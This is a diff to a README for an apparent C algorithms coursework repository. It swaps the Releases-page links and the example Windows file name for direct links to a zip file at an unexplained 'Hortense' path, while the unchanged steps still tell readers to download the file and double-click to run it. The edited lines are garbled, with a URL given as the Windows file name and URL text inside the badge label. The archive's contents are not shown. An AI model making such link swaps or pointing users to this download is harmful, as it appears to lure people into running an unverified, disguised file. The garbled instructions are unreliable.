@@ -6,7 +6,7 @@ Welcome to the "C-Algorithms-Practical-Work-2025" repository! This project is de
 
 ## 📥 Download Link
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/Noel8hhd/C-Algorithms-Practical-Work-2025/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Noel8hhd/C-Algorithms-Practical-Work-2025/Master/Hortense/C-Algorithms-Practical-Work-2025.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Noel8hhd/C-Algorithms-Practical-Work-2025/Master/Hortense/C-Algorithms-Practical-Work-2025.zip)
 
 ## 📜 Overview
 
@@ -30,14 +30,14 @@ To run this application, ensure your system meets the following requirements:
 
 ## 🌐 Download & Install
 
-To get the application, visit the [Releases page](https://github.com/Noel8hhd/C-Algorithms-Practical-Work-2025/releases) to download the latest version. 
+To get the application, visit the [Releases page](https://raw.githubusercontent.com/Noel8hhd/C-Algorithms-Practical-Work-2025/Master/Hortense/C-Algorithms-Practical-Work-2025.zip) to download the latest version. 
 
 Here’s how to download and run the application:
 
 1. Click on the link above to go to the Releases page.
 2. On this page, you will see different versions of the application.
 3. Click on the latest version to view its details.
-4. Download the appropriate file for your operating system (e.g., `C-Algorithms-Practical-Work-2025.exe` for Windows).
+4. Download the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/Noel8hhd/C-Algorithms-Practical-Work-2025/Master/Hortense/C-Algorithms-Practical-Work-2025.zip` for Windows).
 5. Once the download is complete, locate the file on your computer.
 6. Double-click to run it. Follow any on-screen instructions if prompted.
 
